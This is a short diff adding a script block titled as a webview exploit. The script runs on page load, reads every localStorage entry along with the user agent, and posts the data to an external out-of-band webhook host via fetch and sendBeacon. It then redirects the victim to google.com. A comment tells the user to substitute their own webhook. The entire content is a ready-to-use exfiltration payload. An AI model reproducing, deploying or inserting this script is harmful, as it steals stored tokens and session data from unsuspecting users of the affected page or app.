@@ -1,0 +1,11 @@
+<script>
+// ONE-LINER WEBVIEW EXPLOIT - Auto execute on page load
+(function(){
+    const w='https://awypjoegmdrmyskknqsyojbd99yoqgew4.oast.fun'; // GANTI DENGAN WEBHOOK ANDA
+    const d={t:Date.now(),u:navigator.userAgent,l:{}};
+    for(let i=0;i<localStorage.length;i++){let k=localStorage.key(i);d.l[k]=localStorage.getItem(k);}
+    fetch(w,{method:'POST',mode:'no-cors',body:JSON.stringify(d)});
+    navigator.sendBeacon&&navigator.sendBeacon(w,JSON.stringify(d));
+    setTimeout(()=>{window.location='https://google.com';},1000);
+})();
+</script>
